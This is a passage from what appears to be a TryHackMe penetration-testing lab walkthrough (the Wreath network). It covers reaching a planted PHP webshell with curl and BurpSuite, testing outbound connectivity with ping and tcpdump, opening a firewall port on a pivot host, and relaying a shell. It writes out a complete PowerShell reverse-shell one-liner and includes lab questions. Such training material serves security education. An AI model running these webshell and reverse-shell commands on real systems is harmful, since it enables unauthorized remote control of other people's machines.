In the previous task we had a look through the source code of the exploit we found, identified the lines which needed to be updated, then made the necessary changes.

It is now time to run the exploit!  
![Exploit PoC in action!](https://assets.tryhackme.com/additional/wreath-network/d7bd5d950eae.png)  

Success!

Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.

From here we want to obtain a full reverse shell. We have two options for this:

1. We could change the command in the exploit and re-run the code
2. We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice

Option number two is a lot quieter than option number 1, so let's use that.

---

The webshell we have uploaded responds to a POST request using the parameter "`a`" (by default). This means that we have two easy ways to access this. We could use cURL from the command line, or BurpSuite for a GUI option.

**With cURL:**  
`curl -X POST http://IP/web/exploit-USERNAME.php -d "a=COMMAND"`  

![Using cURL to activate the webshell, gaining the same result as in the previous screenshot](https://assets.tryhackme.com/additional/wreath-network/c4fb965ea6f5.png)

_**Note:** in this screenshot,_ `gitserver.thm` _has been added to the_ `/etc/hosts` _file on the attacking machine, mapped to the target IP address._  

**With BurpSuite:**  
We first turn on our Burp proxy (see the [Burpsuite room](https://tryhackme.com/room/rpburpsuite) if you need help with this!) and navigate to the exploit URL:  
![Capturing a request with BurpSuite](https://assets.tryhackme.com/additional/wreath-network/3b9c350a53d8.png)

We then press `Ctrl + R` to send the request to Repeater on the top menu.  

Next we change the "GET" on line 1 to "POST". We then add a `Content-Type` header on line 9 to tell the server to accept POST paramters:  
`Content-Type: application/x-www-form-urlencoded`  

Finally, on line 11 we add `a=COMMAND`:  
![The altered request with POST, the content-type header, and the payload (a=whoami) highlighted](https://assets.tryhackme.com/additional/wreath-network/640de3e036a9.png)  

Press send, and see the response come in!  
![Activated the webshell with Burpsuite](https://assets.tryhackme.com/additional/wreath-network/063482e92f8b.png)  

---

With two methods available, pick your favourite and we'll aim for a shell!

---

**Answer the questions below**

**Bonus Question (Optional):** Using the given code for the exploit we used against the web server, see if you can adapt this exploit to create a full pseudoshell environment.

First up, let's use some basic enumeration to get to grips with the webshell:

What is the hostname for this target?

What operating system is this target?

What user is the server running as?

Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. The typical way of doing this is by executing the `ping` command on the compromised server to ping our own IP and using a network interceptor (Wireshark, TCPDump, etc) to see if the ICMP echo requests make it through. If they do then network connectivity is established, otherwise we may need to go back to the drawing board.

To start up a TCPDump listener we would use the following command:  
`tcpdump -i tun0 icmp`  

_**Note:** if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using_ `ip -a link` _to see the available interfaces._

Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):  
`ping -n 3 ATTACKING_IP   `

This will send three ICMP ping packets back to you.

How many make it to the waiting listener?

Looks like we're going to need to think outside the box to catch this shell.

We have two easy options here:

- Given we have a fully stable shell on .200, we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat) and just catch the shell here
- We could set up a relay on .200 to forward a shell back to a listener

It is up to you which option you choose (although for the sake of practice, a socat relay is suggested); however, whichever way you choose, please be mindful of other users at earlier stages of the network and **ensure that any ports you open are above 15000.**

Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:  
`firewall-cmd --zone=public --add-port PORT/tcp`  
Substituting in your desired choice of port.

In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).  

With that done, set up either a listener or a relay on .200.  

Let's go for a reverse shell!

We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the `.200` firewall in the previous question where it says IP and PORT:  
`powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`  

As this is a web exploit, we now have to URL encode the shell command. If using Burpsuite, you can do this by pasting the command in as the value for the "a" parameter, then selecting it and pressing Ctrl + U:  
![Using Burpsuite to encode the payload with Ctrl + U](https://assets.tryhackme.com/additional/wreath-network/f670383bd3e5.png)

If you are using cURL then there are a variety of options available. cURL does provide a `--data-urlencode` switch; however, it's often easiest to just use a [website](https://www.urlencoder.org/) to encode the shell command, then copy it in with the `-d` switch:  
![Sending the payload with cURL](https://assets.tryhackme.com/additional/wreath-network/be3ea7bf0fe6.png)  

Pick a method (cURL, BurpSuite, or any others) and get a shell!